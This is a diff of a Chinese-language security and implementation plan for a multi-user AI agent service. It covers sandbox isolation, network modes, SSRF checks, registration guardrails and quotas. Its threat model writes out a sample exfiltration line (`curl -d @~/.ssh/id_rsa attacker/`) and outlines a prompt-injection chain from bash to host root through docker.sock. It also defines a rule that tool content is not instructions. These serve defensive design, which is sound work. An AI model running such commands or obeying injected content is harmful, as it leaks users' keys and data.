+4. **沙箱威胁模型**：`--cap-drop ALL`、`no-new-privileges`、`--memory 2g --cpus 1 --pids-limit 256`、`--tmpfs /tmp:size=512m`、非 root `--user`、workspace 只 bind mount 该用户目录（防跨用户**文件**读）。网络按 ADR-005 三档，**缺省 `none`**（D8：容器运行期零网络 ⇒ 网关 / 同网段 / metadata / 跨用户在物理层不可达，应用层不需要再假装做过滤）。若显式放宽到另两档，**必须每用户一张独立自定义网络**，且**默认 `bridge` 禁用是硬性要求**（同网段容器互通会打破跨用户隔离）—— 两者都是 T6.4 的验收断言，不许退化。已知残余风险，全部写进文档不做过度承诺：① 共享内核（runc），不抗针对性内核提权 —— 这条 `none` 挡不住，是默认档下剩下的主要风险；② **放宽到出网模式后，沙箱可达部署环境的同网段内网设备**（路由器管理页、NAS、内网 HTTP 服务；云环境另需 route/防火墙挡 `169.254.169.254`）。缺省 `none` 正是为了把这条整体移出默认状态；要放宽就得改 `settings.yaml` + `kill -HUP`，即"每一次开网络都是一次有记录的配置变更"；③ 网络可达性 = 数据外泄通道（prompt injection 让沙箱内代码 `curl -d @~/.ssh/id_rsa attacker/`），默认 `none` 已消掉这一条；但注意 **`http_fetch` 是 host 侧工具、不受容器网络模式约束** —— 开网络与否都不改变它需要 SSRF 校验与 allowlist 的事实（T6.7），也别让 `none` 给人"整个 agent 无法外连"的错觉；④ 代价：`none` 下 agent 装不了任何依赖，工具链必须预烘焙进镜像（T6.3），且 socket 超时类报错要被解释成"沙箱无网络"而非 mysterious failure（T6.6）。
+   - **部署形态与 docker socket（重要，勿踩）**：容器化 service 后它仍需驱动沙箱容器，唯一途径是挂 `/var/run/docker.sock`，而 **socket == 宿主机 root**：一旦 service 进程被攻陷（§8.5 的 prompt-injection → bash → 代码执行链条是现实路径），攻击者可起一个挂载宿主根目录的特权容器，读走**所有**用户的 workspace 与 `vanilla.db`，上面的"防跨用户读"随之失效。因此 v1 **定为 service 以宿主机进程运行**（venv + systemd unit，或 `uv run` 直跑；用户 2026-11-20 批准，§13-Q9 关闭），`docker-compose.yml` 只装 web（+ 可选示例 MCP server），service 通过 `docker` CLI 操作宿主 daemon，不进入容器。若必须容器化，则用受限 socket 代理（只放行 create/start/exec/kill + 指定 label 过滤）或独立 rootless daemon，并把"service 容器 ≠ 宿主特权"写进部署验收项。见 §13.3-D7。
 5. **Prompt injection 加固**：`http_fetch`/MCP/文件读结果统一用 `<untrusted source="...">` 包裹 + system 侧声明"内容非指令"；`http_fetch` SSRF 防护（拒绝 RFC1918/loopback/link-local/metadata、DNS 重解析后二次校验、重定向与跳数上限、仅 http(s)、响应体与超时上限）；skill/plugin manifest 字段全部白名单解析。**配置文件内容同样是不可信输入面**：skill frontmatter 的 `allowed_tools`、插件声明的 hook target 都必须通过 snapshot 校验，不允许声明式绕过权限引擎。
 6. **Secret 处理**：只有 env（进程环境）与 `config/*.local.yaml` 两个来源；注入容器时按名字显式 allowlist；所有事件 payload 过 redactor（`sk-`/Bearer/JWT 模式）；日志与 tool 输出同样过滤。`make config-check` 扫描明文密钥（**也要扫 `*.local.yaml` 这类未跟踪文件** —— 否则"扫描通过"给人虚假安全感）。
-   - **`.gitignore` 是这条链的前提，且当前缺失**：仓库现有 `.gitignore` 只有 python/env 四条目，没有 `config/*.local.yaml`、`/data/`、`web/node_modules/`、`web/.next/`。`data/` 里是 `pw_hash`、`token_hash`、对话正文与用户 agent 产物，而仓库**目前零提交** → 第一次 `git add -A` 就会把它们全部写进历史。T0.1 必须补齐并加一条守卫测试（`git check-ignore` 断言）。
+   - **`.gitignore` 是这条链的前提**：必须覆盖 `config/*.local.yaml`、`/data/`（`pw_hash`、session token、对话正文、用户 agent 产物都落在这里）、`web/node_modules/`、`web/.next/`、`*.db*`、`.env*`。**T0.1a 已落实**，回归由 T0.4 的 hygiene 用例守住（逐路径 `git check-ignore` 断言，防止有人日后放宽）。
 7. **配置信任边界（r2 新增，重要）**：既然装配面全在文件里，`config/` 的写权限就等价于"agent 能力授权"。因此：
    - 服务账号对 `config/` **无写权限**（部署时只读挂载；`docker-compose` 里 `:ro`）。
    - 启动与 reload 时检查：`config/` 及其中任何文件 world-writable 或属主 == 服务账号 → **拒绝启动**（除非 `CONFIG_ALLOW_LOCAL=1` 的 dev 模式，且此时打印醒目告警）。
@@ -387,7 +396,11 @@ SSE 细节：
    - `CONFIG_TRUST_ON_STARTUP=1` 之类"跳过检查"的开关在文档中标红为 dev-only。
 8. **插件信任**：in-process Python = 与 service 同权限 → 只有 `trusted: true`（`config/plugins.yaml` 声明、需评审）的插件可注册 callable hook / 工具。
 9. **权限不可自批**：run 进程内**永不**写规则文件，`always` 档已从产品里删除；`session` 授权只进内存 TTL 表并写 `audit_log`；`once` 不留痕（除事件）。所有审批必须来自带用户身份的 resolve 请求。
-10. **配额兜底**：per-user `max_concurrent_runs` / `daily_token_budget`（CLI 改）、per-run `max_turns` 与 wall-clock 上限、单 tool 输出字节上限。
+10. **配额兜底（开放注册 + 全局单 key ⇒ 这一条是硬需求，不是 nice-to-have）**：
+    - `per-run`：`max_turns`、wall-clock 上限、单 tool 输出字节上限。
+    - `per-user`：`max_concurrent_runs`（默认 **1**）、`daily_token_budget`、注册时从 `settings.yaml` 落默认值，之后 CLI 可调。
+    - **`global`：两道别人绕不过去的闸门** —— (a) `global_hourly_tokens`：账户级熔断。因为凭据只有一把（§13-D2），N 个注册用户各自不超限、加起来照样能烧穿账户；(b) `sandbox.max_live_containers`：容器数上限 + LRU 空闲回收 + 超限时 429 排队提示（不是静默丢弃）。核定原则：`max_live_containers × sandbox 单容器内存上限 ≲ 宿主可用内存的 1/3`（要给 service、web、宿主其他进程留余量）；默认取 **8**（每容器 2g ⇒ 16g），T1.5 落地时按部署环境实际资源复核并在 `config-check` 里报告越界。
+11. **开放注册护栏（§13-D3 的代价，必须与注册功能同期落地）**：`POST /auth/register` 无邀请码、无首账号特权 ⇒ 攻击面从"已知用户"变成"全网"。护栏四条，缺一都不该开：(a) 注册 per-IP 限速 + per-IP 每日注册数上限（`core/ratelimit.py`，与登录桶分开）；(b) `settings.registration.open` 可一键关闭（默认 true，运维部署到公网前必须显式确认）；(c) 新账号默认 `status=active` 但预算取最保守档，异常用量（如 24h 内顶到 `daily_token_budget`）写 `audit_log` 并可在 CLI 一键 disable；(d) `/capabilities` 只回"我能用什么"，不外泄配置结构（§7）。**明确写下的残余风险**：这个服务一旦公网开放注册，实质是"任何人都能租用一台有 docker 沙箱、能出网、能花你钱的机器跑 agent"，风险接受度应由部署者决定，不是由我们的默认值替他决定 —— 所以 `registration.open` 在 `config-check` 里若为 true 且服务监听非 loopback，会打印一条 error 级提示。
 
 ---
 
@@ -400,8 +413,8 @@ SSE 细节：
 
 | ID | TODO | 验证 | 状态 |
 |---|---|---|---|
-| T0.1a | **仓库卫生 + 版本下限**（原 T0.1 的前半，已单独批准并完成）：(a) `.gitignore` 补 `config/*.local.yaml`、`/data/`、`*.db`/`*.db-shm`/`*.db-wal`、`web/node_modules/`、`web/.next/`、`web/out/`、`web/next-env.d.ts`、`*.tsbuildinfo`、`.mypy_cache/`、`.ruff_cache/`、`.env.*`。(b) 下限收紧到实测版本：`openai>=3.51`（原 `>=1.55`，而 ADR-001/T4.2 的 chunk/usage 归一化按 3.51 语义验证，旧版会静默产出错误 ModelEvent）、`fastapi>=0.163`、`uvicorn[standard]>=0.54` + 注释说明"下限=实测版本"的约定。(c) `uv lock` | ✅ 已验证：`git check-ignore -v` 对 `data/vanilla.db`、`data/artifacts/…`、`config/settings.local.yaml`、`web/node_modules/…`、`web/.next/…`、`*.db`、`.venv`、`__pycache__` 共 8 条全部命中；`git add -A --dry-run` 首次提交仅 6 文件（无 .venv/data/db）；`uv lock` 解析不变（37 包，openai 仍 3.51.0）；`uv sync` clean | ✅ |
-| T0.1b | **依赖新增**：`pydantic-settings>=2.16.3`、`pyyaml>=6.0.3`、`mcp>=2.3.0`；dev 组 `ruff>=0.17.6`/`mypy>=2.4.1`/`pytest-asyncio>=1.5.0`/`pytest-cov>=7.1.0`/`jsonschema>=4.26.0`；`uv lock && uv sync`；顺带补 `pytest-asyncio` 缺失的 `asyncio_mode`/`asyncio_default_fixture_loop_scope`（不配则每次跑测试都脏一条 deprecation warning）。**原计划"不引入 cryptography"这条验证式写错了，已按实情更正**（见 ADR-007 注） | ✅ 实测：`uv run python -c "import mcp, yaml, pydantic_settings, jsonschema"` 通过（mcp 2.3.0）；`uv run pytest -q` 退出码 **5**（tests/ 仍空，符合预期）且**输出零 warning**；`uv lock --check` 干净；包数 37→61，`fastapi 0.163.1 / starlette 1.10.0 / pydantic 2.14.3 / openai 3.51.0 / uvicorn 0.54.0 / httpx 0.28.1 / anyio 4.16.0` 全部**未被降级**（与 T0.1a 逐一比对）。~~拆出 T0.1c 加守卫~~ **T0.1c 已撤销**：见 ADR-007 的实测注 —— 守卫断言在 mcp 2.3.0 上不可执行，且影响仅 15MB/36MB 级别，不值得占 TODO | ✅ |
+| T0.1a | **仓库卫生 + 版本下限**（原 T0.1 的前半，已单独批准并完成）：(a) `.gitignore` 补 `config/*.local.yaml`、`/data/`、`*.db`/`*.db-shm`/`*.db-wal`、`web/node_modules/`、`web/.next/`、`web/out/`、`web/next-env.d.ts`、`*.tsbuildinfo`、`.mypy_cache/`、`.ruff_cache/`、`.env.*`。(b) 下限收紧到实际解析版本：`openai>=3.51`（原 `>=1.55`，而 ADR-001/T4.2 的 chunk/usage 归一化按 3.51 语义验证，旧版会静默产出错误 ModelEvent）、`fastapi>=0.163`、`uvicorn[standard]>=0.54` + 注释说明"下限=实际解析版本"的约定。(c) `uv lock` | ✅ 已验证：`git check-ignore -v` 对 `data/vanilla.db`、`data/artifacts/…`、`config/settings.local.yaml`、`web/node_modules/…`、`web/.next/…`、`*.db`、`.venv`、`__pycache__` 共 8 条全部命中；`git add -A --dry-run` 首次提交仅 6 文件（无 .venv/data/db）；`uv lock` 解析不变（37 包，openai 仍 3.51.0）；`uv sync` clean | ✅ |
+| T0.1b | **依赖新增**：`pydantic-settings>=2.16.3`、`pyyaml>=6.0.3`、`mcp>=2.3.0`；dev 组 `ruff>=0.17.6`/`mypy>=2.4.1`/`pytest-asyncio>=1.5.0`/`pytest-cov>=7.1.0`/`jsonschema>=4.26.0`；`uv lock && uv sync`；顺带补 `pytest-asyncio` 缺失的 `asyncio_mode`/`asyncio_default_fixture_loop_scope`（不配则每次跑测试都脏一条 deprecation warning）。**原计划"不引入 cryptography"这条验证式写错了，已按实情更正**（见 ADR-007 注） | ✅ 已验证：`uv run python -c "import mcp, yaml, pydantic_settings, jsonschema"` 通过（mcp 2.3.0）；`uv run pytest -q` 退出码 **5**（tests/ 仍空，符合预期）且**输出零 warning**；`uv lock --check` 干净；包数 37→61，`fastapi 0.163.1 / starlette 1.10.0 / pydantic 2.14.3 / openai 3.51.0 / uvicorn 0.54.0 / httpx 0.28.1 / anyio 4.16.0` 全部**未被降级**（与 T0.1a 逐一比对）。**T0.1c 已撤销**：import 级守卫在 mcp 上不可执行（见 ADR-007），该传递依赖的影响可接受，不值得单列 TODO | ✅ |
 | T0.2 | `app/core/env.py`：**只放部署相关** env（`DATABASE_PATH, DATA_DIR, CONFIG_DIR, REPO_ROOT, OPENAI_API_KEY, SESSION_*, ALLOW_LOCAL_SANDBOX, CONFIG_ALLOW_LOCAL, SANDBOX_IMAGE`）+ fail-fast 校验；能力参数一律走 `config/*.yaml` | `pytest tests/unit/test_env.py`（缺 key 报错、默认值、路径展开、dev-only 开关识别） | ⬜ |
 | T0.3 | 基础设施：`core/ids.py`(单调 UUID)、`core/clock.py`(可注入时钟)、`core/errors.py`(AppError 层级 + handler)、`core/logging.py`(结构化 JSON + request id) | 单测覆盖 id 单调性、错误码映射、日志字段 | ⬜ |
 | T0.4 | `Makefile`：`lint`(ruff check+format --check, mypy app, config-check)、`test`、`dev`、`config-check`、`sandbox-build`、`gen-ts`。`test` 目标要能容忍"暂无测试"阶段（`pytest -q \|\| [ $$? -eq 5 ]`），但一旦 `tests/` 非空就必须以真实结果判定。**另加 `tests/unit/test_repo_hygiene.py`**：把 T0.1a 的 `.gitignore` 断言固化成用例（逐路径 `git check-ignore`，并断言 `/data`、`*.db`、`config/*.local.yaml`、`web/node_modules` 不可能被跟踪），防止将来有人"顺手"放宽 | `make lint` 全绿；`make test` 在空 `tests/` 下退出 0；手动放一个失败用例后 `make test` 退出非 0；故意改坏 `.gitignore` 时 hygiene 用例失败 | ⬜ |
@@ -415,10 +428,10 @@ SSE 细节：
 | T1.2 | `app/config/loader.py`：读 `config/*.yaml`、`${env:VAR}` 展开（禁止 `${file:}`）、路径相对 `REPO_ROOT` 解析 + 禁止越出 `config/`、**收集式校验**（`ConfigIssue` 一次报全，不 fail-fast 于第一条） | 单测：缺 env 变量、越界路径、语法错、多问题一次性列出；fixture 目录覆盖 | ⬜ |
 | T1.3 | `app/config/snapshot.py`：`ConfigSnapshot`（version/sources sha256/合并后视图）+ `ConfigStore.swap()` 原子替换 + `RunContext.config` 引用旧快照语义 | 单测：reload 前后两个 run 各持自己快照；swap 失败保留旧快照；version 单调 | ⬜ |
 | T1.4 | 合并规则：`plugins/<name>` 资源贡献、`*.local.yaml` 覆盖门控、permission 并集 + deny 优先 + 插件禁声明 bypass、**同名冲突报 error**（skill slug / tool name / mcp server / hook matcher） | 单测：4 类冲突各报一条 error；local 覆盖在未开开关时被忽略 | ⬜ |
-| T1.5 | `config/` 初版：最小可用一套（`settings.yaml` 默认 model + sandbox 限额、`tools.yaml` 关 bash 之外的写类工具、`permissions.yaml` 3 条示例规则、`hooks.yaml`/`mcp.yaml`/`plugins.yaml` 空清单）+ 1 个示例 skill + 1 个示例 agent + `config/README.md` | `make config-check` 通过；快照能列出预期 tools/skills/agents 数 | ⬜ |
+| T1.5 | `config/` 初版：最小可用一套（`settings.yaml`：默认 model/provider 三字段 + sandbox 限额与 **`network_mode: none` 缺省** + `registration.open: true` + 预算默认值；`tools.yaml` 关 bash 之外的写类工具；`permissions.yaml` 3 条示例规则；`hooks.yaml`/`mcp.yaml`/`plugins.yaml` 空清单）+ 1 个示例 skill + 1 个示例 agent + `config/README.md` | `make config-check` 通过；快照能列出预期 tools/skills/agents 数；**缺省快照里 `network_mode == "none"` 且 `registration.open=true` 时 config-check 对非 loopback 监听报 error**（§8.11 那条要在初版就可见，不是等 T13 才发现） | ⬜ |
 | T1.6 | `make config-check` + `python -m app.config check\|dump`（dump 打印合并后的完整能力视图供评审）；`check` 含**明文密钥扫描**与"引用了不存在的工具/server/plugin"检查 | CI 式脚本：故意引用不存在工具 → 非零退出；故意放一个 `sk-` → error | ⬜ |
 | T1.7 | 配置信任边界检查（§8.7）：`config/` 属主/可写性、hook 脚本 world-writable、`CONFIG_ALLOW_LOCAL` 告警；启动与 reload 都执行 | 单测：用 `os.chmod`/tmpdir 构造可写目录 → 拒绝；dev 开关下仅告警 | ⬜ |
-| T1.8 | 只读诊断 API：`GET /config/report`、`GET /tools`、`GET /skills`、`GET /agents`、`GET /plugins`、`GET /mcp/status` + `POST /admin/config/reload`（admin，返回新 version/错误报告） | e2e：非 admin 403；reload 后 report.version 递增；在跑的 run 快照版本不变 | ⬜ |
+| T1.8 | 装配面的两个出口：(a) **运维 CLI** `python -m app.config dump\|report`（合并后视图 + 来源 sha256 + issues）；(b) **用户侧只读 API** `GET /capabilities`（tools/skills/agents 名称+描述+是否需审批）与 `GET /mcp/status`（脱敏：不含 command/args/env 名）。**reload = SIGHUP 处理器**（无 HTTP 端点）；`/config/report`、`/plugins`、`/admin/*` 一律不实现 | 单测：dump 输出含 sources sha256；`/capabilities` 响应体 grep 不到 `command`/`env`/`.yaml` 路径；`kill -HUP` 后 snapshot version 递增；在跑的 run 快照版本不变；`grep -rn 'require_admin\|/admin/' app/` 无命中 | ⬜ |
 
 ### M2 数据层（仅运行时事实）
 
@@ -436,9 +449,9 @@ SSE 细节：
 | ID | TODO | 验证 | 状态 |
 |---|---|---|---|
 | T3.1 | `auth/passwords.py`：scrypt 哈希/校验（参数记录、constant-time 比较） | 单测：正/误口令、参数升级路径、哈希不含明文 | ⬜ |
-| T3.2 | `auth/sessions.py` + `auth/deps.py`：登录签发 cookie、滑动过期、logout 吊销、`require_admin`；`/auth/*` 路由 | e2e：登录→me→logout→me 401；过期 cookie 被拒 | ⬜ |
-| T3.3 | bootstrap：库内无 user 时允许创建 admin，之后关闭；`scripts/seed_admin.py` 兜底；`scripts/set_user_quota.py`（配额 CLI，替代原端点） | 单测：首次成功、第二次 403；脚本改配额生效 | ⬜ |
-| T3.4 | CSRF double-submit（**豁免 login/signup**，见 §8.3）+ token 签发点（`GET /auth/me` 与登录成功响应）+ 安全 cookie 属性 + 登录限速（`core/ratelimit.py` 内存令牌桶，IP+email） | 测试：全新无 cookie 客户端 `POST /auth/login` 成功（不被 CSRF 挡住）；登录后 `POST /threads/{id}/messages` 带 token 成功、缺 token 403；`POST /auth/password` 无 session 401（豁免白名单不覆盖它）；连续 5 次失败后锁定 | ⬜ |
+| T3.2 | `auth/sessions.py` + `auth/deps.py`：登录签发 cookie、滑动过期、logout 吊销、`status=disabled` 账号在 session 解析阶段即拒（不只是登录时）、`/auth/*` 路由。**不实现 `require_admin`**（无 admin 角色，ADR-004） | e2e：登录→me→logout→me 401；过期 cookie 被拒；注册后被 disable → 已存在的 session 立即失效 | ⬜ |
+| T3.3 | **开放注册**（`POST /auth/register`，无邀请码、无首账号特权、`status` 与配额取自 `settings.yaml` 默认）+ 运维 CLI：`scripts/set_user_quota.py`、`scripts/disable_user.py`、`scripts/list_users.py`（配额与禁用只能走 CLI，替代原 admin 端点） | 单测：注册→立即登录可用；`registration.open=false` 时 403；per-IP 超限 429；CLI 脚本改配额/禁用生效且写 `audit_log` | ⬜ |
+| T3.4 | CSRF double-submit（**豁免 login/register**，见 §8.3）+ token 签发点（`GET /auth/me` 与登录/注册成功响应）+ 安全 cookie 属性 + **两套独立限速桶**：登录（IP+email，防口令猜测）与注册（IP，per-hour + per-day，防批量开号，§8.11） | 测试：全新无 cookie 客户端 `POST /auth/login` 与 `POST /auth/register` 均成功（不被 CSRF 挡住）；登录后 `POST /threads/{id}/messages` 带 token 成功、缺 token 403；`POST /auth/password` 无 session 401（豁免白名单不覆盖它）；登录连续 5 次失败锁定；注册超 per-IP 每日上限返回 429 且不落库 | ⬜ |
 | T3.5 | `workspace/paths.py`：每用户 `data/workspaces/<user_id>/`、realpath 约束、`O_NOFOLLOW` 写入、symlink 越界拒绝 | 单测：`../../etc/passwd` 被拒、workspace 内正常、symlink 逃逸被拒 | ⬜ |
 
 ### M4 模型层与 agent 主循环（无工具）
@@ -459,7 +472,7 @@ SSE 细节：
 | T5.2 | API：`/threads`、`/threads/{id}/messages`(202+run_id)、`/threads/{id}/stream`、`/runs/{id}(/events)`、`/runs/{id}/cancel`、`client_msg_id` 幂等 | e2e：POST→读流→终态；重复 `client_msg_id` 同一 run | ⬜ |
 | T5.3 | TS 类型生成：`scripts/gen_typescript.py`（pydantic JSON Schema → json-schema-to-typescript）+ `make gen-ts` + 漂移即失败 | `make gen-ts && git diff --exit-code` | ⬜ |
 | T5.4 | `web/` 脚手架：Next.js(App Router)+TS+Tailwind、`lib/api.ts`(CSRF/session)、登录页、`lib/sse.ts` 自解帧、`lib/reduce.ts`(事件→UI state，按 `(run_id,seq)` 去重)、聊天面板流式渲染 | `npm run build`；reducer 有 vitest；浏览器登录+流式对话可用 | ⬜ |
-| T5.5 | thread 列表/切换/标题、markdown + 代码块渲染、错误态与重连提示；`/config/report` 的**只读**侧栏（当前 config version + 已加载 skills/tools 数量，纯展示） | 手动 + vitest 渲染用例 | ⬜ |
+| T5.5 | thread 列表/切换/标题、markdown + 代码块渲染、错误态与重连提示；`/capabilities` 侧栏（我能调用哪些 tools/skills/agents + 是否需要审批；**不显示** config version、来源 hash、MCP 命令行 —— §7 的脱敏口径要在前端也成立，别自己拼出来）+ 注册页（`/auth/register`，开放注册） | 手动 + vitest 渲染用例；断言侧栏 DOM 里不含 `.yaml` 路径与 sha256 串 | ⬜ |
 
 ### M6 工具系统 + Docker 沙箱
 
@@ -467,11 +480,11 @@ SSE 细节：
 |---|---|---|---|
 | T6.1 | `tools/base.py`+`registry.py`：注册表**由 snapshot 构建**（内置工具 `enabled` 位 + timeout/大小按 `tools.yaml` 收紧，硬上限不可被配置突破）、args 校验、namespace 冲突检测 | 单测：禁用工具不进 catalog；超限配置被钳制并 warning；非法 schema 报错 | ⬜ |
 | T6.2 | `tools/dispatcher.py`：`concurrency_safe` 并行 + 写类串行、per-tool 超时、结果 spill/artifact、`tool_call` 行写入 | 单测：并行 safe 总耗时≈max；unsafe 串行；超时→TOOL_CALL_FAILED | ⬜ |
-| T6.3 | `sandbox/base.py` + `FakeSandbox` + `config sandbox` 限额消费 + 镜像 `sandbox/image/Dockerfile`（python3.12-slim + coreutils/git/rg/jq）+ `make sandbox-build` | FakeSandbox 单测；`@pytest.mark.docker`：build+exec 回显 | ⬜ |
-| T6.4 | `sandbox/docker.py`：`ensure`(复用/创建：label、`--network none`、cap-drop、no-new-privileges、限额、tmpfs、非 root user)、`exec`(argv 直传、env allowlist、超时 kill)、`release`、lifespan `reconcile`(孤儿清理 + idle TTL) | docker 测试：容器复用命中、超时 kill、跨用户不可见、重启对账同一容器 | ⬜ |
+| T6.3 | `sandbox/base.py` + `FakeSandbox` + `config sandbox` 限额消费 + 镜像 `sandbox/image/Dockerfile` + `make sandbox-build`。**默认 `network_mode: none`（D8）⇒ 镜像必须自带 agent 真会用的全部工具链**：coreutils/git/rg/jq/find/python3 + 一组常用包（requests/httpx、pandas? 由 §1.2 范围决定，宁缺勿滥、写清单进 `docs/sandbox.md`），因为运行期装不了任何东西；镜像内保留 `--index-url` 参数化以便将来开网络时复用。镜像版本与 `settings.sandbox.image_tag` 绑定，加依赖 = 改 Dockerfile + rebuild（配置级动作，非运行时）。**部署环境的出网能力差异很大**（公共 registry 与默认 PyPI 在不少环境不可达，需 registry mirror / 包索引代理）⇒ Dockerfile 里的 apt/pip 源与基础镜像 tag 都要可从 `settings.yaml`（`apt_mirror`/`pip_index_url`/`base_image`）注入并参数化覆盖；构建失败要给出"哪个源不可达"的清晰错误，不要只抛 docker 退出码 | FakeSandbox 单测；`@pytest.mark.docker`：build+exec 回显；**断网构建路径**：把 mirror URL 指向不可达主机时，构建报错能指名失败的源；**无网可用路径**：默认 `none` 档下，镜像自带的工具链必须能跑通全部内置工具（任何步骤依赖运行期联网都算缺陷） | ⬜ |
+| T6.4 | `sandbox/docker.py`：`ensure`(复用/创建：label、cap-drop、no-new-privileges、限额、tmpfs、非 root user、**`--network` 按 `settings.sandbox.network_mode` 取 `none`（**默认**，此时不创建任何网络）\| `internal` \| `per_user_bridge`**；后两档才建每用户一张自定义网络 `va-net-<user_hash>` 并与容器同生命周期创建/销毁)、`exec`(argv 直传、env allowlist、超时 kill)、`release`、lifespan `reconcile`(**孤儿容器 + 孤儿网络**清理 + idle TTL + `max_live_containers` 计数与 LRU)。**禁止使用默认 `bridge`**（同网段互通会打破跨用户隔离，ADR-005） | docker 测试：容器复用命中、超时 kill、跨用户**文件**不可见、重启对账同一容器；**网络三条硬断言**（设计前提，回归不许退化）：① 用户 B 容器连用户 A 容器 IP 不可达；② `network_mode: internal` 下容器出网失败；③ `none` 下连网关都连不到 | ⬜ |
 | T6.5 | `builtin/fs.py`：read_file(offset/limit/行号)、write_file、edit_file(str_replace 精确+唯一性)、delete/move（仅 workspace 内 + 默认 ask）；host 侧 realpath | 单测：diff 正确、str_replace 不唯一拒绝、越界拒绝、二进制/编码检测 | ⬜ |
-| T6.6 | `builtin/search.py`(glob/grep 沙箱内 fd/rg，输出限量) + `builtin/shell.py`(bash：默认 ask、cwd 持久、env 净化、硬超时) | FakeSandbox argv 断言 + docker e2e：`git status` 类命令 | ⬜ |
-| T6.7 | `builtin/net.py`：`http_fetch`（host 侧、SSRF 校验、**域名 allowlist 来自 `tools.yaml`**、大小/重定向/超时、HTML→文本粗提取） | 单测：私有地址/元数据 IP/非 http scheme/allowlist 外域名被拒；本地 fixture 正常抓取 | ⬜ |
+| T6.6 | `builtin/search.py`(glob/grep 沙箱内 fd/rg，输出限量) + `builtin/shell.py`(bash：默认 ask、cwd 持久、env 净化、硬超时)。**默认 `none` 档下必须把网络类失败翻译成人话**：捕获 `ENETUNREACH`/`EHOSTUNREACH`/`EAI_AGAIN`/DNS 解析失败，在 tool result 里明确"沙箱无网络（`network_mode: none`）；需要网络请改 `config/settings.yaml` 并 `kill -HUP <pid>`"，而不是把裸 traceback 丢给模型让它瞎猜下一步 | FakeSandbox argv 断言 + docker e2e：`git status` 类命令；**网络失败翻译用例**：默认档下容器内 `python -c "urllib.request.urlopen('https://example.com')"` → tool result 含上述指引且不含裸 traceback | ⬜ |
+| T6.7 | `builtin/net.py`：`http_fetch`（host 侧、SSRF 校验、**域名 allowlist 来自 `tools.yaml`**、大小/重定向/超时、HTML→文本粗提取）。注意这是 **host 侧**工具，其 allowlist 是沙箱网络放开后我们仅剩的应用层控制点；`settings.sandbox.network_mode=per_user_bridge` 时容器内 `curl` 不受此 allowlist 约束（只能靠 §8.4 的部署前提兜底），这个不对称要写进 `docs/`（不能让文档暗示"http_fetch 有 allowlist ⇒ 出网受控"） | 单测：私有地址/元数据 IP/非 http scheme/allowlist 外域名被拒；本地 fixture 正常抓取；docker e2e：容器内可直连白名单外主机（记录为**已知不对称**，非缺陷） | ⬜ |
 | T6.8 | loop 接入 tools：`TOOL_CALL_*` 事件（args 增量→完成→结果）、tool message 回灌、失败分类 | e2e：ScriptedModelClient 发一次 `read_file` → 前端出现工具卡片与结果 | ⬜ |
 
 ### M7 权限引擎（读配置，不写配置）
@@ -542,10 +555,10 @@ SSE 细节：
 | T13.1 | 精确 token 预算：按 provider usage 校准估算、`context_window` 水位、超限前预检；`settings.yaml` 提供 window/阈值 | 单测：水位单调、估算偏差 <15%（对照 usage fixture） | ⬜ |
 | T13.2 | `agent/compaction.py`：阈值触发（默认 80%）+ 手动 `/compact`、保留 pinned 首条 + 最近 N 轮、摘要写 `compaction` 表 + `CONTEXT_COMPACTED`、PreCompact hook | 集成：长对话压缩后仍能正确续答；`event_log` 不被破坏 | ⬜ |
 | T13.3 | tool 输出治理：per-tool 字节上限（snapshot）、spill artifact + 前端"查看完整输出"、敏感字段 redact | 单测 + 手动 | ⬜ |
-| T13.4 | 用量与配额：`/usage/summary`、per-user `daily_token_budget`（CLI 改）超限 → run failed + 事件、per-user `max_concurrent_runs` | e2e：预算与并发上限触发路径 | ⬜ |
+| T13.4 | 用量与配额（开放注册的兜底闸门，§8.10）：`/usage/summary`（当前用户 + 预算余量）、per-user `daily_token_budget`（CLI 改）超限 → run failed + 事件、per-user `max_concurrent_runs`（默认 1）、**`global_hourly_tokens` 账户级熔断**（跨用户聚合，超限后所有新 run 直接 429 且发 `ERROR` 事件 + `audit_log`）、**`sandbox.max_live_containers` + LRU 空闲回收 + 超限 429** | e2e：三层上限各自的触发路径；关键用例 —— "10 个用户各自不超 per-user 预算但合计击穿 `global_hourly_tokens`" 时第 11 个 run 被拒（这条是单 key 架构的存在性测试，不许省略） | ⬜ |
 | T13.5 | 稳定性：错误码表收口、`event_log` retention 裁剪、`scripts/db_backup.py`（stdlib sqlite3 backup API）、优雅关闭（等 run 落终态；pending interrupt 保留可恢复）、reload 与关闭时的快照语义文档化 | 集成 + 重启演练：无悬挂 run 假状态、备份可读 | ⬜ |
-| T13.6 | 部署：按 §8.4 的形态 —— **service 作为宿主机进程**（`deploy/vanilla-agent.service` systemd 单元 + `uv run uvicorn --workers 1`，靠它经 `docker` CLI 驱动沙箱），`docker-compose.yml` 只含 web（+ 可选示例 MCP server 与反代）；**不出现 `/var/run/docker.sock` 挂载**。`.env.example`、`README` 快速开始、`Makefile` 全目标；web 侧只访问 service 的 HTTP 面 | 干净机器：`systemd` 起 service + `docker compose up` 起 web → 端到端对话；`grep -r docker.sock deploy/` 无命中；`--workers 1` 与 §12 单进程约束一致 | ⬜ |
-| T13.7 | 安全审查：逐条核 §8（越权、symlink、SSRF、secret 泄漏、CSRF、bypass policy、**配置目录写权限演练**：以 service 身份尝试改 `config/permissions.yaml` 应失败）；跑 `/security-review` | findings 清零或转为新 TODO | ⬜ |
+| T13.6 | 部署：按 §8.4 的形态 —— **service 作为宿主机进程**（`deploy/vanilla-agent.service` systemd 单元 + `uv run uvicorn --workers 1`，靠它经 `docker` CLI 驱动沙箱），`docker-compose.yml` 只含 web（+ 可选示例 MCP server 与反代）；**不出现 `/var/run/docker.sock` 挂载**。`.env.example`、`README` 快速开始、`Makefile` 全目标；web 侧只访问 service 的 HTTP 面。**部署文档必须把"要不要公网开放注册"写成显式的、需要部署者确认的一步**（`config-check` 在 `registration.open=true` 且监听非 loopback 时报 error，§8.11），并说明 `sandbox.network_mode` 三档各自的暴露面（缺省 `none`；`per_user_bridge` 是**需要显式开启的放宽**，代价 = 沙箱可达同网段内网设备，开启前要在 `docs/deploy.md` 里勾选确认） | 干净机器：`systemd` 起 service + `docker compose up` 起 web → 端到端对话；`grep -r docker.sock deploy/` 无命中；`--workers 1` 与 §12 单进程约束一致；`kill -HUP` 后配置生效且 run 不中断；公网模拟监听 + open=true 时 `config-check` 报错 | ⬜ |
